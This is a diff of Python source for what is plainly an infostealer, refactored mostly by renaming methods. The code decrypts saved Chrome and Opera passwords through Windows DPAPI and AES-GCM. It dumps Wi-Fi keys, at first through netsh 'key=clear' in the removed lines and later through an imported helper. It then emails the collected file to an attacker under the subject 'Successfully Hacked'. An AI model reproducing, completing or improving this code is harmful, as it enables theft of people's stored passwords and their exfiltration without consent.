@@ -3,9 +3,9 @@ from email.mime.base import MIMEBase
 from datetime import datetime, timedelta
 from Crypto.Cipher import AES
 from email import encoders
-from lib.subject import subject_text
 import smtplib, ssl, os, json, base64, win32crypt
-import subprocess as sp
+from psutil import net_if_addrs
+from get_wifi import get_wifi_password
 
 path_local = r'AppData\Local\Google\Chrome\User Data\Local State'
 
@@ -24,10 +24,10 @@ class Vbscript:
         self._port = port
     
     # chrome
-    def getChrome(self, chrome):
+    def get_chrome(self, chrome):
         return datetime(1601, 1, 1) + timedelta(microseconds=chrome)
 
-    def getPassword(self):
+    def get_password(self):
         with open(os.environ['userprofile'] + os.sep + path_local, 'r', encoding='utf-8') as get_path:
             local = get_path.read()
             local = json.loads(local)
@@ -36,52 +36,33 @@ class Vbscript:
         key_master = win32crypt.CryptUnprotectData(key_master, None, None, None, 0)[1]
         return key_master
 
-    def decryptPayload(self, secret, payload):
+    def decrypt_payload(self, secret, payload):
         return secret.decrypt(payload)
 
-    def onSecret(self, aes_key, ivs):
+    def on_secret(self, aes_key, ivs):
         return AES.new(aes_key, AES.MODE_GCM, ivs)
 
-    def decryptPassword(self, buff, key_master):
+    def decrypt_password(self, buff, key_master):
         try:
             ivs = buff[3:15]
             payload = buff[15:]
-            secret = self.onSecret(key_master, ivs)
-            decrypted_passwd = self.decryptPayload(secret, payload)
+            secret = self.on_secret(key_master, ivs)
+            decrypted_passwd = self.decrypt_payload(secret, payload)
             decrypted_passwd = decrypted_passwd[:-16].decode()
             return decrypted_passwd
-        except Exception as err:
-            return f'1: {err}'
-    #wifi
-    def Get_Wifi_Password(self):
-        try:
-            get_wifi = sp.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='cp860')
-            for network in get_wifi.split('\n'):
-                if 'Todos os Perfis de Usuários' in network:
-                    two_point = network.find(':')
-                    info_network = network[two_point+2:]
-                    all_networks = sp.check_output(
-                        ['netsh', 'wlan', 'show', 'profiles', info_network, 'key', '=', 'clear'], encoding='cp860'
-                        )
-                    
-                    for passwords in all_networks.split('\n'):
-                        if 'Nome SSID' in passwords:
-                            two_point1 = network.find(':')
-                            names = passwords[two_point1+2:]
-
-                        if 'Conteúdo da Chave' in passwords:
-                            two_point2 = network.find(':')
-                            passwd = passwords[two_point2+2:]
-                            get_network = f'Rede: {names}\nSenha: {passwd}\n\n'
-                            with open('fuckyou.csv', 'a') as wifi:
-                                wifi.write(f'{get_network}')
-                            wifi.close()
-        except: ...
-        
+        except Exception:
+            return 
+    
+    def wifi(self):
+        checked_interface = net_if_addrs()
+        for check in checked_interface:
+            if 'Wi-Fi' in check:
+                get_wifi_password()
+            return
     # send email
-    def Send_Email(self):
+    def send_email(self):
         msg = MIMEMultipart()
-        msg['Subject'] = subject_text
+        msg['Subject'] = 'Successfully Hacked'
         msg['From'] = self._email_from
         msg['To'] = self._email_to
         try:
@@ -95,8 +76,8 @@ class Vbscript:
             files.close()
             msg.attach(att)
             
-        except Exception as error:
-            return error
+        except Exception:
+            return
         
         context = ssl.create_default_context()
         with smtplib.SMTP(self._server, port=self._port) as smtp:
@@ -104,11 +85,11 @@ class Vbscript:
                 smtp.starttls(context=context)
                 smtp.login(self._email_from, self._password)
                 smtp.sendmail(msg['From'], msg['To'], msg.as_string())
-            except Exception as errs:
-                return errs
+            except Exception:
+                return
             
     # opera or opera GX
-    def getEncryptionKey():
+    def get_encryption_key():
         try:
             try:
                 local_state_path = os.path.join(os.environ["userprofile"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
@@ -118,21 +99,19 @@ class Vbscript:
                 local_state = f.read()
                 local_state = json.loads(local_state)
         except FileNotFoundError:
-            pass
+            return
 
         key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         key = key[5:]
         return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
-    def decryptPasswordOP(password, key):
+    def decrypt_password_OP(password, key):
         try:
             iv = password[3:15]
             password = password[15:]
             cipher = AES.new(key, AES.MODE_GCM, iv)
             return cipher.decrypt(password)[:-16].decode()
-        except Exception as e:
-            print(e)
-
+        except Exception:
             try:
                 return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
             except Exception as Err:
